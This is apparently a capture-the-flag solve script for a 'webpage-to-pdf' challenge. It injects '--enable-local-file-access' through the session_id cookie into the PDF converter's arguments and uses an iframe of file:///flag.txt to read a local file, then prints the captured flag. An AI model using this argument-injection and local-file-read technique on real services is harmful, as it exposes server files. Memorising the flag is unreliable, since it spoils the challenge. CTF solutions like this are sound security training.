import requests 

url = "https://c52a-webpage-to-pdf-1-t100558-zzxnkh54cduloj4ncusdpr3f.hkcert24.pwnable.hk"

""" 
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>JS Bin</title>
</head>
<body>
  <iframe src="file:///flag.txt"></iframe>
</body>
</html>
"""

r = requests.post(
    f"{url}/process", 
    cookies={"session_id": "--enable-local-file-access f91126b5-79bf-4b89-b770-03b9b746caf3"},
    data={
        "url": "https://jsbin.com/kuzumowowe"
    }
)

# Access https://{url}/f91126b5-79bf-4b89-b770-03b9b746caf3.pdf
# hkcert24{h0w-t0-use-AI-wisely-and-s4fe1y?}